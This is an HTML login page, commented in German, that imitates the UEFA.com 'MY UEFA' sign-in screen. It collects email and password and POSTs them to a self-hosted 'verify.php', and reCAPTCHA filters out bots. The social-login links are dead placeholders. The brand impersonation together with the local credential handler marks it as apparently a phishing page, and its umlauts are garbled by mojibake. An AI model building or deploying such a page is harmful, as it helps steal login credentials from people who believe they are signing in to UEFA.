<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>UEFA.com Login</title>
  <link rel="stylesheet" href="./login.css" />

  <!-- 
    1) reCAPTCHA v3 Enterprise‚ÄìSkript einbinden 
    Ersetze hier bitte "YOUR_SITE_KEY" durch deinen echten Site-Key.
  -->
  <script src="https://www.google.com/recaptcha/enterprise.js?render=YOUR_SITE_KEY"></script>
</head>
<body>
  <header class="header">
    <a href="#" class="logo">UEFA.com</a>
    <button class="language-selector">Deutsch ‚ñº</button>
  </header>

  <div class="container">
    <div class="my-uefa-container">
      <div class="my-uefa-logo">MY UEFA</div>
      <h1 class="headline">Schlie√üe dich noch heute 43 Millionen Fu√üballfans an</h1>
      <ul class="benefits-list">
        <li>Schaue dir Highlights und Live-Spiele an</li>
        <li>Nimm an Spielen teil und fordere deine Freunde heraus</li>
        <li>Sichere dir Karten f√ºr die gr√∂√üten Spiele Europas</li>
      </ul>
      <p class="access-text">Dein pers√∂nlicher Zugang zu:</p>
      <div class="app-icons">
        <div class="app-icon"></div>
        <div class="app-icon"></div>
        <div class="app-icon"></div>
        <div class="app-icon"></div>
        <div class="and-more">
          <span>und vieles</span>
          <span>mehr!</span>
        </div>
      </div>
    </div>

    <div class="login-container">
      <h2 class="login-title">Einloggen</h2>

      <!-- Fehlermeldungsbereich (wird per JS ein-/ausgeblendet) -->
      <div id="errorMessage" class="error-message" style="display: none; color: red; margin-bottom: 15px;"></div>

      <div class="social-buttons">
        <a href="#" class="social-button facebook-button">
          <!-- Facebook-Icon SVG -->
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="white" style="margin-right: 10px;">
            <path
              d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"/>
          </svg>
          Anmelden √ºber Facebook
        </a>
        <a href="#" class="social-button google-button">
          <!-- Google-Icon SVG -->
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="#4285F4" style="margin-right: 10px;">
            <path
              d="M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z"/>
          </svg>
          Anmelden √ºber Google
        </a>
        <a href="#" class="social-button apple-button">
          <!-- Apple-Icon SVG -->
          <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="white" style="margin-right: 10px;">
            <path
              d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.53 4.08zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
          </svg>
          Anmelden mit Apple
        </a>
      </div>

      <div class="or-divider">oder</div>

      <!-- 
        2) Login-Formular 
        action="verify.php" ‚Üí dein PHP-Backend, das sp√§ter das reCAPTCHA-Token validiert 
      -->
      <form id="loginForm" action="verify.php" method="POST">
        <!-- Honeypot-Feld (unsichtbar f√ºr echte User, aber Bots f√ºllen es manchmal aus) -->
        <!--
        <div style="display:none">
          <label for="hp_email">Honeypot</label>
          <input type="text" id="hp_email" name="hp_email" autocomplete="off" />
        </div>
        -->

        <!-- E-Mail -->
        <div class="form-group">
          <label for="email" class="form-label">E-Mail</label>
          <input
            type="email"
            id="email"
            name="email"
            class="form-control"
            required
            value=""
          />
        </div>

        <!-- Passwort -->
        <div class="form-group">
          <label for="password" class="form-label">Passwort</label>
          <div class="password-container">
            <input
              type="password"
              id="password"
              name="password"
              class="form-control"
              required
              value=""
            />
            <span class="toggle-password">üëÅÔ∏è</span>
          </div>
        </div>

        <!-- Angemeldet bleiben und Passwort vergessen -->
        <div class="remember-me">
          <input type="checkbox" id="remember" name="remember" checked />
          <label for="remember" style="margin-left: 5px;">Angemeldet bleiben</label>
          <a href="#" class="forgot-password">Ich habe mein Passwort vergessen</a>
        </div>

        <!-- Verstecktes Feld f√ºr das reCAPTCHA-Token -->
        <input type="hidden" name="recaptcha_token" id="recaptcha_token" />

        <!-- Abschicken-Button (kein data-callback mehr, weil wir es per JS steuern) -->
        <button type="submit" class="submit-button">
          Abschicken
        </button>
      </form>

      <div class="new-account-section">
        <div class="new-account-divider">
          <span class="new-account-text">Neu bei UEFA?</span>
        </div>
        <a href="../Registration/registration.html" id="createAccount" title="UEFA-Account anlegen"
          class="create-account-button">UEFA-Account anlegen</a>
      </div>
    </div>
  </div>

  <!-- 
    3) Hier kommt das reCAPTCHA-JavaScript, das beim Formular-Submit den Token holt 
    und das Formular erst danach wirklich absendet. 
  -->
  <script>
    // Sobald DOM geladen ist, Listener f√ºr "submit" registrieren
    document.addEventListener("DOMContentLoaded", function () {
      const loginForm = document.getElementById("loginForm");
      const recaptchaTokenInput = document.getElementById("recaptcha_token");
      const errorMessage = document.getElementById("errorMessage");

      loginForm.addEventListener("submit", function (e) {
        e.preventDefault(); // Verhindere, dass das Formular sofort abgeschickt wird

        // Optional: Honeypot pr√ºfen (falls du das aktiv nutzt):
        /*
        const honeypotValue = document.getElementById("hp_email").value;
        if (honeypotValue) {
          errorMessage.textContent = "Bot erkannt!";
          errorMessage.style.display = "block";
          return;
        }
        */

        // reCAPTCHA v3 Enterprise ausf√ºhren
        grecaptcha.enterprise.ready(function () {
          grecaptcha.enterprise
            .execute("YOUR_SITE_KEY", { action: "login" })
            .then(function (token) {
              // Token in verstecktes Feld schreiben
              recaptchaTokenInput.value = token;

              // Jetzt das Formular wirklich absenden (POST ‚Üí verify.php)
              loginForm.submit();
            })
            .catch(function (err) {
              console.error("reCAPTCHA fehlgeschlagen:", err);
              errorMessage.textContent = "reCAPTCHA-Fehler. Bitte aktualisiere die Seite und versuche es erneut.";
              errorMessage.style.display = "block";
            });
        });
      });

      // Toggle f√ºr Passwort-Anzeige (üëÅÔ∏è / üôà)
      const togglePassword = document.querySelector(".toggle-password");
      const passwordInput = document.querySelector('input[name="password"]');
      togglePassword.addEventListener("click", function () {
        const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
        passwordInput.setAttribute("type", type);
        togglePassword.textContent = type === "password" ? "üëÅÔ∏è" : "üôà";
      });
    });
  </script>
</body>
</html>
